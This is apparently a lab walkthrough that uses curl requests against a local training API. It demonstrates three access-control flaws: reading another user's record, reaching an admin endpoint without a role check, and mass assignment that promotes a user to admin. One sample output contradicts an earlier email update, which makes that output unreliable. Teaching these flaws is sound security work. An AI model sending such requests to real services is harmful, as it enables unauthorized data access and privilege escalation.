# Finding the Bug

## Map the API

Start by confirming the lab is running and logging in:

```bash
curl -s http://127.0.0.1:5000/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"alice123"}'
```

```json
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
```

Save the token to a variable:

```bash
TOKEN=$(curl -s http://127.0.0.1:5000/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"alice123"}' \
  | python3 -c "import json,sys; print(json.load(sys.stdin)['token'])")
```

Fetch your own profile:

```bash
curl -s http://127.0.0.1:5000/api/users/1 \
  -H "Authorization: Bearer $TOKEN"
```

```json
{"id":1,"username":"alice","role":"user","email":"alice@corp.local","flag1":null}
```

## Spot the BOLA

Alice is user 1. Try user 2:

```bash
curl -s http://127.0.0.1:5000/api/users/2 \
  -H "Authorization: Bearer $TOKEN"
```

The server returns bob's profile without checking that alice owns it. The URL parameter `2` is used as the lookup key with no ownership verification. `flag1` appears in the response.

## Spot the BFLA

Try the admin endpoint with alice's regular-user token:

```bash
curl -s http://127.0.0.1:5000/api/admin/users \
  -H "Authorization: Bearer $TOKEN"
```

The endpoint returns all users. Alice's token is accepted without any role check. `flag2` appears in the admin user's record.

Confirm that the role-protected endpoint blocks access before escalation:

```bash
curl -s -o /dev/null -w '%{http_code}' \
  http://127.0.0.1:5000/api/admin/secret \
  -H "Authorization: Bearer $TOKEN"
```

```
403
```

That endpoint does check role. The mass assignment flaw is what bypasses it.

## Spot the mass assignment

Look at the update endpoint:

```bash
curl -s -X PATCH http://127.0.0.1:5000/api/users/1 \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"email":"test@test.com"}'
```

```json
{"message":"updated"}
```

Now try adding a `role` field to the same request:

```bash
curl -s -X PATCH http://127.0.0.1:5000/api/users/1 \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"role":"admin"}' 
```

```json
{"message":"updated"}
```

The server accepts it. Verify by fetching alice's profile again:

```bash
curl -s http://127.0.0.1:5000/api/users/1 \
  -H "Authorization: Bearer $TOKEN"
```

```json
{"id":1,"username":"alice","role":"admin","email":"alice@corp.local","flag1":null}
```

Alice is now an admin in the database.
